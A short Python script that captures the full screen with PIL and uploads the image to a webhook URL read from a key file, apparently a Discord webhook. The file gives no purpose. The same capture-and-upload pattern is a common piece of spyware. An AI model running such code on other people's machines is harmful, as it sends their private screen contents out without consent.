import requests
from PIL import ImageGrab
import json

with open("data/key.json") as Key:
    KEY = json.load(Key)
WEBHOOK_URL = KEY['webhook']

def capture():
    img = ImageGrab.grab()
    img.save("screenshot/screen.png")

def send_dis():
    with open("screenshot/screen.png", "rb") as f:
        requests.post(
            WEBHOOK_URL,
            files={
                "file": ("screenshot.png", f, "image/png")
            }
        )
